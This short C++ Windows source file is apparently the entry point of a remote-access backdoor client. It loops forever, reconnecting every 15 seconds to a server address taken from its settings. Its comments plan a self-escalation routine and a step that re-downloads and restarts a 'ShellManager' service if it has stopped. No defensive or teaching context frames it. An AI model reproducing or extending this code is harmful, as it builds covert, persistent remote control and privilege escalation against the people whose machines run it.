#include "general.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//Should add a self escalation routine

	Client MyClient(Settings::serverIP, Settings::serverPort); //Client

	while (true)
	{

		//Here maybe check if the ShellManager service is still active, and if it isn't download it if necessary and start it up again

		if (!MyClient.connected)
		{
			while (!MyClient.Connect())
			{
				Sleep(15000);
			}
		}
		Sleep(15000);
	}

	return 0;
}